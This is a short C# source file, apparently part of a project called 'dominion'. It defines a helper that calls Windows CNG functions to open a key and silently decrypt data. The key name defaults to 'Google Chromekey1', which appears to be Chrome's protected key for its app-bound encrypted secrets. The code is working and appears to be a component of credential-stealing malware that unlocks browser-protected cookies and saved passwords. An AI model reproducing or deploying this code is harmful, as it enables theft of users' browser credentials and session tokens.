using System;
using System.Runtime.InteropServices;

namespace dominion.src.dominion.Dependencies.Encryption
{
    public static class CngDecryptor
    {
        private const int NCRYPT_SILENT_FLAG = 64;

        [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
        private static extern int NCryptOpenStorageProvider(out IntPtr phProvider, string pszProviderName, int dwFlags);

        [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
        private static extern int NCryptOpenKey(IntPtr hProvider, out IntPtr phKey, string pszKeyName, int dwLegacyKeySpec, int dwFlags);

        [DllImport("ncrypt.dll")]
        private static extern int NCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, IntPtr pPaddingInfo, byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);

        [DllImport("ncrypt.dll")]
        private static extern int NCryptFreeObject(IntPtr hObject);

        public static byte[] Decrypt(byte[] inputData, string providerName = "Microsoft Software Key Storage Provider", string keyName = "Google Chromekey1")
        {
            IntPtr zero = IntPtr.Zero;
            IntPtr zero2 = IntPtr.Zero;
            byte[] result;
            try
            {
                int num = NCryptOpenStorageProvider(out zero, providerName, 0);
                if (num != 0)
                {
                    throw new Exception(string.Format("NCryptOpenStorageProvider error: Code {0}", num));
                }
                num = NCryptOpenKey(zero, out zero2, keyName, 0, 0);
                if (num != 0)
                {
                    throw new Exception(string.Format("NCryptOpenKey error: Code {0}", num));
                }
                int num2;
                num = NCryptDecrypt(zero2, inputData, inputData.Length, IntPtr.Zero, null, 0, out num2, NCRYPT_SILENT_FLAG);
                if (num != 0)
                {
                    throw new Exception(string.Format("NCryptDecrypt size determination error: Code {0}", num));
                }
                byte[] array = new byte[num2];
                num = NCryptDecrypt(zero2, inputData, inputData.Length, IntPtr.Zero, array, array.Length, out num2, NCRYPT_SILENT_FLAG);
                if (num != 0)
                {
                    throw new Exception(string.Format("NCryptDecrypt error: Code {0}", num));
                }
                Array.Resize<byte>(ref array, num2);
                result = array;
            }
            finally
            {
                if (zero2 != IntPtr.Zero)
                {
                    NCryptFreeObject(zero2);
                }
                if (zero != IntPtr.Zero)
                {
                    NCryptFreeObject(zero);
                }
            }
            return result;
        }
    }
}